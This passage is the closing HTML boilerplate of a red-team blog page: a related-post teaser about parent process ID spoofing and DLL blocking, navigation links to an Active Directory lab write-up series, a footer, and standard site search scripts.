Spoofing and Blocking DLLs</h3><div class="text-muted small"><p> Introduction In this post we are going to look at two “features” (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microso...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/NHA-Part-2/" class="btn btn-outline-primary" prompt="Older"><p>AD Pwnage: Ninja Hackers Academy Part 2</p></a> <a href="/posts/NHA-Part-4/" class="btn btn-outline-primary" prompt="Newer"><p>AD Pwnage: Ninja Hackers Academy Part 4</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/crypt0acee">Ahmed Sher</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
